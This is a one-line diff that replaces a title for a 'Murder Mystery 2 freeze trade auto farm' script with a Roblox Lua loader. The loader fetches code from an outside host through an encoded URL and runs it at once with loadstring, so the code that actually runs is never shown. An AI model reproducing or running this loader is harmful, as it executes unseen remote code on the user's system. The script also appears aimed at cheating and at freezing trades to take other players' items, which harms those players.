@@ -1,1 +1,1 @@
-# Mm2-Freeze-Trade-Script-Auto-Farm
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjMzZmJiZGE0LWNjNjEtNGU3MC1iODZhLTc0ZGRmMDBhM2IxNCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJuZXd1aSJ9fQ"))()
